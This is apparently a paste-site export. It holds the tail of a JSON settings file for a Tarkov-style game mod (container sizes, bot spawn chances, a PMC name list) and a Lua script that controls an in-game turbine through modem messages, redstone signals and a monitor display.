        ""Filter"": false
      },
      ""DogtagCase"": {
        ""Height"": 10,
        ""Width"": 10,
        ""Filter"": false
      },
      ""MagazineCase"": {
        ""Height"": 7,
        ""Width"": 7,
        ""Filter"": false
      },
      ""AmmunitionCase"": {
        ""Height"": 8,
        ""Width"": 8,
        ""Filter"": false
      },
      ""WeaponCase"": {
        ""Height"": 10,
        ""Width"": 6,
        ""Filter"": false
      },
      ""ItemsCase"": {
        ""Height"": 8,
        ""Width"": 8,
        ""Filter"": false
      },
      ""GrenadeCase"": {
        ""Height"": 8,
        ""Width"": 8,
        ""Filter"": false
      },
      ""WZWallet"": {
        ""Height"": 2,
        ""Width"": 2,
        ""Filter"": false
      },
      ""SimpleWallet"": {
        ""Height"": 2,
        ""Width"": 2,
        ""Filter"": false
      },
      ""MoneyCase"": {
        ""Height"": 7,
        ""Width"": 7,
        ""Filter"": false
      },
      ""LuckyScav"": {
        ""Height"": 14,
        ""Width"": 14,
        ""Filter"": false
      },
      ""StreamerCase"": {
        ""Height"": 11,
        ""Width"": 7,
        ""Filter"": false
      },
      ""ArmorPlateCase"": {
        ""Height"": 12,
        ""Width"": 8,
        ""Filter"": false
      }
    },
    ""SecureContainers"": {
      ""KappaWidth"": 4,
      ""AlphaHeight"": 2,
      ""KappaHeight"": 4,
      ""AlphaWidth"": 2,
      ""GammaWidth"": 3,
      ""GammaHeight"": 3,
      ""GammaTUEWidth"": 4,
      ""GammaTUEHeight"": 4,
      ""BetaHeight"": 2,
      ""BetaWidth"": 3,
      ""EpsilonWidth"": 4,
      ""EpsilonHeight"": 2,
      ""DevHeight"": 3,
      ""DevWidth"": 3,
      ""WaistPouchWidth"": 2,
      ""WaistPouchHeight"": 2
    },
    ""EnableCSM"": true
  },
  ""Scav"": {
    ""SCAVPockets"": {
      ""FourthHeight"": 1,
      ""FourthWidth"": 1,
      ""ThirdHeight"": 1,
      ""ThirdWidth"": 1,
      ""SecondHeight"": 1,
      ""SecondWidth"": 1,
      ""FirstHeight"": 1,
      ""FirstWidth"": 1
    },
    ""HostileBosses"": false,
    ""FriendlyBosses"": false,
    ""CarBaseStanding"": 0.25,
    ""ScavTimer"": 60,
    ""ScavCustomPockets"": false,
    ""ScavLab"": true,
    ""FriendlyScavs"": false,
    ""HostileScavs"": false,
    ""StandingFriendlyKill"": -0.04,
    ""StandingPMCKill"": 0.01,
    ""Health"": {
      ""LeftArm"": 160,
      ""RightArm"": 160,
      ""Head"": 135,
      ""Chest"": 185,
      ""Stomach"": 170,
      ""LeftLeg"": 165,
      ""RightLeg"": 165
    },
    ""EnableScavHealth"": true,
    ""EnableScav"": true,
    ""ScavStats"": {
      ""MaxHydration"": 100,
      ""MaxEnergy"": 100
    },
    ""EnableStats"": false
  },
  ""Bots"": {
    ""AIChance"": {
      ""KolontayStreets"": 25,
      ""KolontayGZ"": 45,
      ""ForcePartisan"": false,
      ""PartisanCustoms"": 30,
      ""PartisanShoreline"": 30,
      ""PartisanWoods"": 30,
      ""PartisanLighthouse"": 30,
      ""Kaban"": 30,
      ""TagillaNight"": 30,
      ""TrioLighthouse"": 30,
      ""TrioShoreline"": 30,
      ""TrioWoods"": 30,
      ""Zryachiy"": 100,
      ""CultistCustoms"": 40,
      ""CultistShoreline"": 15,
      ""Trio"": 30,
      ""RaiderLab"": 45,
      ""RaiderReserve"": 35,
      ""CultistFactory"": 20,
      ""CultistWoods"": 15,
      ""CultistGroundZero"": 44,
      ""Rogue"": 70,
      ""Tagilla"": 30,
      ""Shturman"": 30,
      ""Glukhar"": 35,
      ""Sanitar"": 30,
      ""Reshala"": 30,
      ""Killa"": 35
    },
    ""ArmorDurab"": {
      ""PMCMax"": 100,
      ""FollowerMax"": 100,
      ""BossMax"": 100,
      ""MarksmanMax"": 100,
      ""ScavMax"": 100,
      ""RogueMax"": 100,
      ""RaiderMax"": 100,
      ""PMCMin"": 90,
      ""FollowerMin"": 90,
      ""BossMin"": 100,
      ""MarksmanMin"": 90,
      ""ScavMin"": 50,
      ""RogueMin"": 90,
      ""RaiderMin"": 90
    },
    ""WeaponDurab"": {
      ""PMCMax"": 100,
      ""FollowerMax"": 100,
      ""BossMax"": 100,
      ""MarksmanMax"": 100,
      ""ScavMax"": 100,
      ""RogueMax"": 100,
      ""RaiderMax"": 100,
      ""PMCMin"": 95,
      ""FollowerMin"": 80,
      ""BossMin"": 80,
      ""MarksmanMin"": 60,
      ""ScavMin"": 85,
      ""RogueMin"": 80,
      ""RaiderMin"": 80
    },
    ""EnableBots"": false
  },
  ""PMC"": {
    ""NameOverride"": false,
    ""ForceCustomWaves"": false,
    ""CustomWaveChance"": 100,
    ""PMCChance"": {
      ""PMCNamePrefix"": 1,
      ""PMCAllNamePrefix"": 1,
      ""PMCLooseWep"": 15,
      ""HostileSamePMC"": 85,
      ""HostilePMC"": 100,
      ""PMCWepEnhance"": 25
    },
    ""LevelUpMargin"": 10,
    ""LevelDownMargin"": 70,
    ""PMCNameList"": ""Sinistar\r\nMorgan\r\nMayoringram\r\nAssAssin\r\nGhostFenixx\r\nG10orgos\r\nFortis\r\nDaveyB0y\r\nMMX\r\nTabi\r\nJojo\r\njvs\r\ndspider\r\nHenny\r\nMylu\r\nXen0Xys\r\nShruggzilla\r\nDoddsy\r\nMoffed\r\nBeagle\r\nthorncp\r\nEagle\r\nBroCC\r\nCthulhu\r\nKaryash\r\nlilthicccums\r\nTobi\r\nEmilia\r\nParka4our\r\nDonmohnke\r\nSingularity\r\nTogay\r\nGodHimself\r\nThomaszhrets\r\nAsianLover69\r\nRodyChodes\r\nl6uc6if6er\r\nbllt\r\nSaltyDroog\r\nM_conniptions\r\ntagilla\r\nTricolorHen061\r\nWaffentrager\r\nHabit\r\nUmsirqualquerai\r\nshep\r\nCannabis\r\ntrappussy\r\nShiro\r\nChomp\r\nTheSparta\r\nLostQuasar\r\nssh\r\nLacyway\r\nKronzky\r\njbs4bmx\r\naleves\r\nFontaine\r\nCWX\r\nTwistedGA\r\nLimbo\r\nSamSWAT\r\nRevingly\r\nKattomine\r\nFox\r\nGamenator\r\nCarl\r\njrdenny1\r\nDecompresS\r\nCats\r\nAtonicX\r\nsyra\r\nStako\r\nCheiftan\r\nelectric\r\nImTheRickHere\r\nmajorlier\r\nbearPhone\r\nMasterChief\r\nThe2ndarbiter\r\ncowkiller19\r\nKarma\r\nJen14owns\r\nRubMyRubber\r\nFrumorn\r\nBuyingGF\r\nRekty\r\nRebrix\r\nDatPhatAsian\r\nChinaski\r\nChameleon\r\nNeCzar\r\nPonderingOrb\r\nSerakym\r\nArsanthania\r\nYT_Mark\r\nBeDaLek\r\nNukey\r\nOwl\r\nJoshtheOG\r\nbatkiller\r\nVampireKitten\r\nBadwolf_54\r\nJustin\r\nAgentMoulder\r\nLayerofBlubber\r\nD3ovm\r\nkiobu\r\n7AmatoR7\r\nKAcidi\r\nZ3R0\r\nSpiral\r\nXsos\r\nVortex\r\nalphakiller\r\nbiohazard\r\nli3raa\r\nDalamadur\r\ncentollojames\r\nlennyrod\r\nZooey\r\nMaoci\r\nMarchwin\r\nMiki__\r\nInnerMiddle\r\npersistent\r\nYarik85\r\nDeadLeaves\r\nSenko\r\nNexus4880\r\nSlickboi\r\nTallanX\r\ntrippy\r\nguidot\r\nJanuary\r\nCloudy\r\nMrElmoEN\r\nNekoKami\r\nDOKDOR\r\ndeathbricks\r\nHustlesofter\r\nVenican\r\nNickMillion\r\nJuncker\r\nPhantomInTime\r\nVox\r\nTraveler\r\nnimbul\r\nEreshkigal\r\nSerWolfik"",
    ""NamesEnable"": false,
    ""ChancesEnable"": true,
    ""PMCRatio"": 50,
    ""AItoPMC"": {
      ""CursedToPMC"": 20,
      ""SnipertoPMC"": 0,
      ""ScavToPMC"": 30,
      ""ScavToPMCFactory"": 13,
      ""RogueToPMC"": 5,
      ""RaiderToPMC"": 7
    },
    ""EnableConvert"": false,
    ""DisableLowLevelPMC"": false,
    ""LootableMelee"": true,
    ""EnablePMC"": true
  },
  ""Custom"": {
    ""EnableCustom"": false,
    ""LoggerIntoServer"": false,
    ""DisableSPTFriend"": false,
    ""DisableCommando"": false,
    ""DisablePMCMessages"": false,
    ""CustomCheck1"": false,
    ""CustomCheck2"": false,
    ""CustomCheck3"": false,
    ""CustomCheck4"": false,
    ""CustomNumber1"": 12345,
    ""CustomNumber2"": 12345,
    ""CustomNumber3"": 12345,
    ""CustomNumber4"": 12345
  }
}"
muDVcSDu,Turbine control,CdoubleOK,Lua,Saturday 18th of October 2025 03:27:50 PM CDT,"local modem = peripheral.find(""modem"")
local monitor = peripheral.wrap(""front"")

monitor.setCursorPos(1,1)
monitor.clear()
monitor.setTextScale(0.5)
monitor.setBackgroundColor(colors.cyan)
monitor.setCursorPos(4, 1)
monitor.write(""Turbine #1"")
monitor.setCursorPos(1, 3)
monitor.write(""Fuel Feed"")
monitor.setCursorPos(1, 4)
monitor.write(""-=-=-=-=-=-=-=-"")
monitor.setCursorPos(1, 7)
monitor.write(""Clutch"")
monitor.setCursorPos(1, 8)
monitor.write(""-=-=-=-=-=-=-=-"")
monitor.setCursorPos(1, 11)
monitor.write(""Output"")
monitor.setCursorPos(1, 12)
monitor.write(""-=-=-=-=-=-=-=-"")
term.clear()
term.setCursorPos(1,1)
print(""Running..."")
 
function fuelFeed(side, mode, bgc)
  rs.setOutput(side, true)
  modem.transmit(3,4,mode)
  monitor.setCursorPos(1,1)
  monitor.setCursorPos(1, 5)
  monitor.clearLine()
  monitor.blit(mode, ""0000000"", bgc)
  monitor.setCursorPos(1, 5)
  sleep(1)
  rs.setOutput(side, false)
end
 
function shift(side, mode, bgc)
  rs.setOutput(side, true)
  modem.transmit(2,3,mode)
  monitor.setCursorPos(1, 9)
  monitor.clearLine()
  monitor.blit(mode, ""0000000"", bgc)
  monitor.setCursorPos(1, 9)
  sleep(1)
end

function battCall(channel)
  modem.open(channel)
  local event, modemSide, senderChannel, replyChannel, message, senderDistance = os.pullEvent(""modem_message"")
  term.setCursorPos(1,2)
  term.clearLine(1,2)
  print(message)
  modem.close(channel)
  return(message)
end

local function outputCall(channel)
    modem.open(channel)
    local event, modemSide, senderChannel, replyChannel, message, senderDistance = os.pullEvent(""modem_message"")
    monitor.setCursorPos(1,13)
	monitor.clearLine()
    monitor.write(message)
    modem.close(channel)
end

while rs.getInput(""front"") == false
do

local batt = battCall(4) 
local speed = rs.getAnalogInput(""right"")

outputCall(5)

if speed == 0
then
	shift (""top"", ""Offline"", ""eeeeeee"")
	
	if batt <= 25
	then
	fuelFeed(""bottom"", ""Engaged"", ""ddddddd"")
	end
	
	if batt >= 30
	then
	fuelFeed(""top"", ""Offline"", ""eeeeeee"")
 end
	
 sleep(5)
	
elseif speed >= 1 and speed <= 14
then
	shift (""top"", ""Low RPM"", ""1111111"")

  if batt >= 30
  then
  fuelFeed(""top"", ""Offline"", ""eeeeeee"")
  end
	
elseif speed >= 15
then
	shift (""back"", ""Engaged"", ""ddddddd"")

  if batt >= 30
  then
  fuelFeed(""top"", ""Offline"", ""eeeeeee"")
  end
end

end
"
